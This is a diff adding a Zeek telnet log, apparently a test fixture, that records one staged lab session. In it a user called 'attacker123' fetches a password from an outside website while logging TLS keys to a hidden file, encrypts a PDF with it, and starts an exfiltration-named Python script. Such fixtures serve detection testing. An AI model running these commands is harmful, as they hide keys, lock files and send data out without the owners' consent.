@@ -1,0 +1,18 @@
+#separator \x09
+#set_separator	,
+#empty_field	(empty)
+#unset_field	-
+#path	telnet
+#open	2021-10-14-19-49-08
+#fields	_stream	_target	start_time	uid	id_orig_h	id_orig_p	id_resp_h	id_resp_p	display	terminal	sent_line
+#types	string	string	string	string	addr	port	addr	port	string	string	string
+telnet	zeek	2020 01/22/20 01:24	Cxx0pm19H0snYkzOn3	192.168.57.1	50432	192.168.57.3	23	/private/tmp/com.apple.launchd.beHHVYT2pI/org.macosforge.xquartz:0	(empty)	(empty)
+telnet	zeek	2020 01/22/20 01:24	Cxx0pm19H0snYkzOn3	192.168.57.1	50432	192.168.57.3	23	(empty)	XTERM-256COLOR	(empty)
+telnet	zeek	2020 01/22/20 01:24	Cxx0pm19H0snYkzOn3	192.168.57.1	50432	192.168.57.3	23	(empty)	(empty)	attacker123
+telnet	zeek	2020 01/22/20 01:24	Cxx0pm19H0snYkzOn3	192.168.57.1	50432	192.168.57.3	23	(empty)	(empty)	ls
+telnet	zeek	2020 01/22/20 01:24	Cxx0pm19H0snYkzOn3	192.168.57.1	50432	192.168.57.3	23	(empty)	(empty)	PW=`SSLKEYLOGFILE=/.hidden/log.log curl "https://www.passwordrandom.com/query?command=password"`; qpdf foo.pdf --encrypt $PW $PW 256 -- enc_foo.pdf
+telnet	zeek	2020 01/22/20 01:24	Cxx0pm19H0snYkzOn3	192.168.57.1	50432	192.168.57.3	23	(empty)	(empty)	ls
+telnet	zeek	2020 01/22/20 01:24	Cxx0pm19H0snYkzOn3	192.168.57.1	50432	192.168.57.3	23	(empty)	(empty)	cat ex\x09
+telnet	zeek	2020 01/22/20 01:24	Cxx0pm19H0snYkzOn3	192.168.57.1	50432	192.168.57.3	23	(empty)	(empty)	python exf\x09
+telnet	zeek	2020 01/22/20 01:24	Cxx0pm19H0snYkzOn3	192.168.57.1	50432	192.168.57.3	23	(empty)	(empty)	exit
+#close	2021-10-14-19-49-08
